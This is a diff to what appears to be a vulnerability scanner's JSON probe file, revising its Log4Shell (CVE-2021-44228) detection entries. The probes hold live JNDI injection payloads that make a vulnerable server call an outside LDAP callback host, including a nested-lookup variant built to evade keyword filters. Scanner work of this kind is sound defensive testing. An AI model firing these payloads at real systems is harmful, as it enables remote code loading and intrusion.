@@ -100,26 +100,28 @@
       ]
     },
     "log4shell": {
-      "description": "Log4Shell (CVE-2021-44228) — JNDI injection via Log4j lookups, including WAF bypass variants",
+      "description": "Log4Shell (CVE-2021-44228) \u2014 JNDI injection via Log4j lookups. Collaborator-based detection (checking interactions after sending probe) is strongly preferred over timing-only detection for reliable confirmation.",
       "tech_match": ["Java", "Tomcat", "Spring", "JBoss", "WebLogic", "Log4j"],
       "param_match": ["data", "object", "payload", "token", "session", "username", "email", "search", "q", "user-agent", "referer"],
       "probes": [
         {
           "payload": "${jndi:ldap://{{callback}}/a}",
-          "description": "Log4Shell JNDI lookup — if Log4j processes this, it makes an outbound LDAP connection to the callback. Absence of literal 'jndi' in response (processed, not reflected) plus timing from DNS/LDAP lookup confirms vulnerability.",
+          "description": "Log4Shell JNDI lookup \u2014 if Log4j processes this, it makes an outbound LDAP/DNS connection to the callback. Use Collaborator interactions as primary signal; header changes (Set-Cookie, error headers) or timing diff as secondary indicators.",
           "matchers": [
             {"type": "not_word", "words": ["${jndi:"]},
-            {"type": "timing", "min_ms": 5000}
+            {"type": "header_change"},
+            {"type": "differential_timing", "min_diff_ms": 3000}
           ],
           "severity": "critical",
           "confidence_boost": 70
         },
         {
           "payload": "${${lower:j}ndi:${lower:l}dap://{{callback}}/a}",
-          "description": "Log4Shell WAF bypass variant — nested lookups reconstruct 'jndi:ldap' at runtime, evading static keyword filters",
+          "description": "Log4Shell WAF bypass variant \u2014 nested lookups reconstruct 'jndi:ldap' at runtime, evading static keyword filters. Check Collaborator for DNS/LDAP interactions as primary detection method.",
           "matchers": [
             {"type": "not_word", "words": ["${jndi:", "${lower:"]},
-            {"type": "timing", "min_ms": 5000}
+            {"type": "header_change"},
+            {"type": "differential_timing", "min_diff_ms": 3000}
           ],
           "severity": "critical",
           "confidence_boost": 70
